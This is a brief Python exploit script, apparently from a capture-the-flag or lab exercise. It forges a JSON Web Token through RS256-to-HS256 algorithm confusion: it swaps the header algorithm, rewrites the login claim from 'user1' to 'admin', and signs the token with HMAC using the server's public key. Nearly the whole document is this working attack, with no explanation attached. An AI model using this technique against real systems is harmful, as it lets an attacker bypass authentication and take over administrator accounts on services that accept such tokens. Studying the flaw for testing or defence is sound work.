import jwt
from base64 import b64encode as b64e, b64decode as b64d, urlsafe_b64encode
import hmac
from hashlib import sha256

pubkey = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAo2R2WvnypG871pBqaAUY
ShKibV21THtfdQq6uEcVMGHm7kcvsAriHTvC3IlhmfIIMxd3zBGAyNgPpUQiqJQG
Ac7W3yUxMRO8gzWZzZMjzQT0mDAwQrNWPlKUvDS7mJOymk1kxnilqhuXi8NsbfbC
9STzZUAoqSyrsLGyggLB5yEPBuNZ3wK/3yNaDmTny3i5s96qfujmQ15MJ/QAgHCr
+Zeq54fG32yz0o4br88SUEdsExblVYosf3GYRt0cMF/zzeyAJ7QmRqxvN2fNwa/N
IMPLYzZJs7L1aY75ryzV4P39SRTyQn/op6iWUCuVhZRchKXTGQUfZ7b1HA95it1b
UQIDAQAB
-----END PUBLIC KEY-----"""

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InVzZXIxIn0.U3hpjM6YDXlITQjR9mzmF4d5dRxXO2o_JZGZe8JeGvNlcZd_FVOHxLYvPc6EQp9iT43W57hYHIZP8Zf3CQk-mKA8i2wvzmQUDlAn_rz9YoDmsfMYWZL6pphm2bpvL3sj6xTx5irhCVvISzhmJMeTnkBlMyDBs2MjAFTl7Gn_Fc2lfW6niRZ9rZP21L5ikThJF8mx7-DZF27P4wurS2DAcg6BJ-lTdnVL6hFgpACxHA9PfiuyWOjbglHz5s17tmLvvxYPQF8FkgDboQHAyG3ewPd8iUjeVX3uvpsmRTPnmvwLRSAu_5zftGrzgpouBn2fZQFKOwQri_OpM84pKehDLA"

header, payload, signature = token.split('.')
new_header  = b64e(b64d(header).replace(b"RS256", b"HS256")).rstrip(b"=")
## Add suficient number of "=" if this line throws incorrect padding exception
new_payload = b64e(b64d(payload+"=").replace(b"user1", b"admin")).rstrip(b"=")
sig = urlsafe_b64encode(hmac.new(pubkey, b".".join([new_header,new_payload]), sha256 ).digest()).rstrip(b"=")

print("NEW KEY: ", b".".join([new_header,new_payload, sig]))

